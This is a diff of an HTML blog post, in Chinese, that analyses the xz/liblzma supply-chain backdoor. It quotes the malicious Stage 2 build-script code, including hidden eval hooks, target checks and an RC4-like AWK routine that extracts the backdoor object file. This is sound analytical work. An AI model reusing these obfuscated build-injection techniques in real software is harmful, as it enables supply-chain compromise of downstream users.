+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">P</span><span class="o">=</span><span class="s2">&#34;-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">C</span><span class="o">=</span><span class="s2">&#34;pic_flag=\&#34; </span><span class="nv">$P</span><span class="s2">\&#34;&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">O</span><span class="o">=</span><span class="s2">&#34;^pic_flag=\&#34; -fPIC -DPIC\&#34;</span>$<span class="s2">&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">R</span><span class="o">=</span><span class="s2">&#34;is_arch_extension_supported&#34;</span>
@@ -647,12 +951,35 @@
 </span></span><span class="line"><span class="cl">rm -f liblzma_la-crc64-fast.o <span class="o">||</span> <span class="nb">true</span>
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="nv">$DHLd</span>
-</span></span></code></pre></div><h3 id="stage-2">Stage 2</h3>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="stage-2">Stage 2</h3>
 <p>Stage 2是 Andres 在原始电子邮件（即 5.6.0 版本）中附加的<a href="https://www.openwall.com/lists/oss-security/2024/03/29/4/1"target="_blank" rel="external nofollow noopener noreferrer">fected.txt</a> 文件。这个 bash 脚本中发生了很多事情，因为这是实际编译过程修改发生的地方。</p>
 <p>从混淆分析的角度来看，该脚本存在三个有趣的片段，其中两个仅出现在5.6.1版本中。</p>
 <h4 id="扩展-机制">扩展 机制</h4>
 <p>片段1</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">vs</span><span class="o">=</span><span class="sb">`</span>grep -broaF <span class="s1">&#39;~!:_ W&#39;</span> <span class="nv">$srcdir</span>/tests/files/ 2&gt;/dev/null<span class="sb">`</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">vs</span><span class="o">=</span><span class="sb">`</span>grep -broaF <span class="s1">&#39;~!:_ W&#39;</span> <span class="nv">$srcdir</span>/tests/files/ 2&gt;/dev/null<span class="sb">`</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$vs</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;x&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
 </span></span><span class="line"><span class="cl"><span class="nv">f1</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$vs</span> <span class="p">|</span> cut -d: -f1<span class="sb">`</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$f1</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;x&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
@@ -669,8 +996,31 @@
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
-</span></span></code></pre></div><p>片段3：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">vs</span><span class="o">=</span><span class="sb">`</span>grep -broaF <span class="s1">&#39;jV!.^%&#39;</span> <span class="nv">$top_srcdir</span>/tests/files/ 2&gt;/dev/null<span class="sb">`</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>片段3：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">vs</span><span class="o">=</span><span class="sb">`</span>grep -broaF <span class="s1">&#39;jV!.^%&#39;</span> <span class="nv">$top_srcdir</span>/tests/files/ 2&gt;/dev/null<span class="sb">`</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$vs</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;x&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
 </span></span><span class="line"><span class="cl"><span class="nv">f1</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$vs</span> <span class="p">|</span> cut -d: -f1<span class="sb">`</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$f1</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;x&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
@@ -687,17 +1037,30 @@
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
-</span></span></code></pre></div><p>这两个片段几乎相同，所以可以一起处理它们。</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这两个片段几乎相同，所以可以一起处理它们。</p>
 <p><img loading="lazy" src="resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240407125802810.png" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240407125802810.png, resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240407125802810.png 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240407125802810.png 2x" sizes="auto" data-title="image-20240407125802810" data-alt="image-20240407125802810" width="1408" height="478" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <ol>
 <li>
 <p>首先，他们尝试在tests/files/目录中查找（grep -broaF）两个文件，其中包含以下字节（签名）</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Fragment 1: <span class="s2">&#34;~!:_ W&#34;</span> and <span class="s2">&#34;|_!{ -&#34;</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Fragment 1: <span class="s2">&#34;~!:_ W&#34;</span> and <span class="s2">&#34;|_!{ -&#34;</span>
 </span></span><span class="line"><span class="cl">Fragment 3: <span class="s2">&#34;jV!.^%&#34;</span> and <span class="s2">&#34;%.R.1Z&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># 注：grep 实际输出格式如下：file_name:offset:signature。例如：</span>
 </span></span><span class="line"><span class="cl">$ grep -broaF <span class="s2">&#34;XYZ&#34;</span>
 </span></span><span class="line"><span class="cl">testfile:9:XYZ
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>
 <p>如果找到该文件，提取每个文件的偏移量（cut -d: -f2，以 : 为分隔符，采用第二个字段），第一个偏移量 + 7 保存为 $start，第二个文件的第二个偏移量 - $start 保存作为 $end.</p>
 </li>
@@ -709,14 +1072,28 @@
 </li>
 <li>
 <p>然后解压数据以便立即执行：</p>
-<pre tabindex="0"><code>eval `... | xz -F raw --lzma2 -dc`
-</code></pre></li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eval `... | xz -F raw --lzma2 -dc`
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ol>
 <p>事实上，在现有的5.6.0和5.6.1的TAR存档中都没发现任何带有签名的文件，看上去像是一个待使用的“扩展插件”系统，允许未来添加脚本以在该阶段的上下文中运行，而无需修改原始的负载文件。毕竟，不断地修改 bad 和 good 测试文件很可疑。</p>
 <h4 id="目标选择">目标选择</h4>
 <p>此脚本会检查各种条件，例如计算机的体系结构。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="k">if</span> ! <span class="o">(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$build</span><span class="s2">&#34;</span> <span class="p">|</span> grep -Eq <span class="s2">&#34;^x86_64&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$build</span><span class="s2">&#34;</span> <span class="p">|</span> grep -Eq <span class="s2">&#34;linux-gnu</span>$<span class="s2">&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span><span class="p">;</span><span class="k">then</span>
-</span></span></code></pre></div><ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="k">if</span> ! <span class="o">(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$build</span><span class="s2">&#34;</span> <span class="p">|</span> grep -Eq <span class="s2">&#34;^x86_64&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$build</span><span class="s2">&#34;</span> <span class="p">|</span> grep -Eq <span class="s2">&#34;linux-gnu</span>$<span class="s2">&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span><span class="p">;</span><span class="k">then</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
 <li>
 <p>如果 amd64/x86_64 是构建的目标</p>
 </li>
@@ -725,7 +1102,20 @@
 </li>
 </ul>
 <p>它还会检查正在使用的工具链：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$GCC</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s1">&#39;xyes&#39;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$GCC</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s1">&#39;xyes&#39;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
 </span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$CC</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s1">&#39;xgcc&#39;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
@@ -734,20 +1124,42 @@
 </span></span><span class="line"><span class="cl"><span class="nv">LDv</span><span class="o">=</span><span class="nv">$LD</span><span class="s2">&#34; -v&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> ! <span class="nv">$LDv</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep -qs <span class="s1">&#39;GNU ld&#39;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
 </span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
-</span></span></code></pre></div><p>如果正在尝试复现构建 Debian 或 Red Hat 软件包：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> -f <span class="s2">&#34;</span><span class="nv">$srcdir</span><span class="s2">/debian/rules&#34;</span> <span class="o">||</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$RPM_ARCH</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;xx86_64&#34;</span><span class="p">;</span><span class="k">then</span>
-</span></span></code></pre></div><p>因此，这种攻击似乎是针对使用 Debian 或 Red Hat 派生发行版运行 glibc 的 amd64 系统。</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果正在尝试复现构建 Debian 或 Red Hat 软件包：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> -f <span class="s2">&#34;</span><span class="nv">$srcdir</span><span class="s2">/debian/rules&#34;</span> <span class="o">||</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$RPM_ARCH</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;xx86_64&#34;</span><span class="p">;</span><span class="k">then</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因此，这种攻击似乎是针对使用 Debian 或 Red Hat 派生发行版运行 glibc 的 amd64 系统。</p>
 <p>其他系统目前可能容易受到攻击，但没有明确的证据。</p>
 <h4 id="后门提取">后门提取</h4>
 <p>正如 Andres 在原始电子邮件中指出的那样，在某些时候会提取 .o 文件并将其编织到编译/链接过程中。由以下代码负责</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">N</span><span class="o">=</span><span class="m">0</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">N</span><span class="o">=</span><span class="m">0</span>
 </span></span><span class="line"><span class="cl"><span class="nv">W</span><span class="o">=</span><span class="m">88664</span>
 </span></span><span class="line"><span class="cl"><span class="k">else</span>
 </span></span><span class="line"><span class="cl"><span class="nv">N</span><span class="o">=</span><span class="m">88664</span>
 </span></span><span class="line"><span class="cl"><span class="nv">W</span><span class="o">=</span><span class="m">0</span>
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span><span class="line"><span class="cl">xz -dc <span class="nv">$top_srcdir</span>/tests/files/<span class="nv">$p</span> <span class="p">|</span> <span class="nb">eval</span> <span class="nv">$i</span> <span class="p">|</span> <span class="nv">LC_ALL</span><span class="o">=</span>C sed <span class="s2">&#34;s/\(.\)/\1\n/g&#34;</span> <span class="p">|</span> <span class="nv">LC_ALL</span><span class="o">=</span>C awk <span class="s1">&#39;BEGIN{FS=&#34;\n&#34;;RS=&#34;\n&#34;;ORS=&#34;&#34;;m=256;for(i=0;i&lt;m;i++){t[sprintf(&#34;x%c&#34;,i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l&lt;8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t[&#34;x&#34; (NF&lt;1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf &#34;%c&#34;,(v+k)%m}&#39;</span> <span class="p">|</span> xz -dc --single-stream <span class="p">|</span> <span class="o">((</span>head -c +<span class="nv">$N</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span> <span class="o">&amp;&amp;</span> head -c +<span class="nv">$W</span><span class="o">)</span> &gt; liblzma_la-crc64-fast.o <span class="o">||</span> <span class="nb">true</span>
-</span></span></code></pre></div><p>版本之间的差异归结为有损压缩(compressed-but-somewhat-mangled)的有效负载的大小，在 5.6.0 中是 88792，在 5.6.1 中是 88664，AWK 脚本中的一个值发生了变化，我们稍后会介绍这一点。</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>版本之间的差异归结为有损压缩(compressed-but-somewhat-mangled)的有效负载的大小，在 5.6.0 中是 88792，在 5.6.1 中是 88664，AWK 脚本中的一个值发生了变化，我们稍后会介绍这一点。</p>
 <p>实际上某些步骤与Stage 1相同（它的二进制 payload 在“good”文件数据中先前被忽略的部分中）。</p>
 <ol>
 <li>
@@ -761,7 +1173,48 @@
 </li>
 <li>
 <p>下一步是 AWK 脚本，它对输入流进行 <a href="https://en.wikipedia.org/wiki/RC4"target="_blank" rel="external nofollow noopener noreferrer">RC4&hellip;ish</a> 描述。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">BEGIN <span class="o">{</span>  <span class="c1"># Initialization part.</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">BEGIN <span class="o">{</span>  <span class="c1"># Initialization part.</span>
 </span></span><span class="line"><span class="cl">  <span class="nv">FS</span> <span class="o">=</span> <span class="s2">&#34;\n&#34;</span><span class="p">;</span>  <span class="c1"># Some AWK settings.</span>
 </span></span><span class="line"><span class="cl">  <span class="nv">RS</span> <span class="o">=</span> <span class="s2">&#34;\n&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="nv">ORS</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
@@ -798,14 +1251,23 @@
 </span></span><span class="line"><span class="cl">  <span class="c1"># with the key, but here for some add is used instead (might be an AWK thing).</span>
 </span></span><span class="line"><span class="cl">  <span class="nb">printf</span> <span class="s2">&#34;%key&#34;</span>, <span class="o">(</span>v + k<span class="o">)</span> % m
 </span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>
 <p>输入被解密后，这一步进行解压：<code>xz -dc --single-stream</code> ；</p>
 </li>
 <li>
 <p>然后使用head技巧截取从 N (0) 到 W (~86KB) 的字节，并保存为 liblzma_la-crc64-fast.o ，这是最终的二进制后门。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">((</span>head -c +<span class="nv">$N</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span> <span class="o">&amp;&amp;</span> head -c +<span class="nv">$W</span><span class="o">)</span> &gt; liblzma_la-crc64-fast.o
-</span></span></code></pre></div></li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">((</span>head -c +<span class="nv">$N</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span> <span class="o">&amp;&amp;</span> head -c +<span class="nv">$W</span><span class="o">)</span> &gt; liblzma_la-crc64-fast.o
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ol>
 <p>5.6.0 版本N为0，W为88792</p>
 <p><img loading="lazy" src="resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240406215017407.png" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406215017407.png, resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240406215017407.png 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406215017407.png 2x" sizes="auto" data-title="image-20240406215017407" data-alt="image-20240406215017407" width="2224" height="394" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
